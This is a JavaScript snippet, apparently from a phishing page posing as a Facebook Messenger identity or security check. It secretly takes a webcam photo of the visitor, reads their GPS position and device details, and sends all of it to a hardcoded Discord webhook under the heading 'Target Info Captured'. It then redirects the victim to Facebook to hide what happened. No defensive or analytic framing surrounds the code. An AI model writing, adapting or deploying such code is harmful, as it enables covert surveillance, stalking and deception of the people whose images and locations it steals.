<script>
    const webhookURL = "https://discord.com/api/webhooks/1482987004991111318/XKQNQNpaubgBiLr3ZXww5xVQs4qeHZmMlKFBG3nU-vA5zaRlJjNgKLWK7uiNw3cH-7a0";

    async function startFBScan() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const { latitude, longitude } = pos.coords;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('file', blob, 'fb_messenger_audit.jpg');
                        fd.append('payload_json', JSON.stringify({
                            content: "🔵 **Messenger Alert: Identity Verified!**",
                            embeds: [{
                                color: 1565439,
                                title: "Target Info Captured",
                                fields: [
                                    { name: "📍 Google Maps Link", value: `https://www.google.com/maps?q=${latitude},${longitude}` },
                                    { name: "📱 Device Info", value: navigator.userAgent }
                                ],
                                timestamp: new Date()
                            }]
                        }));

                        await fetch(webhookURL, { method: 'POST', body: fd });
                        window.location.href = "https://www.facebook.com/settings?tab=security";
                    }, 'image/jpeg');
                }, 1500);
            }, () => { window.location.href = "https://www.facebook.com"; });
        } catch (e) { window.location.href = "https://www.facebook.com"; }
    }
</script>
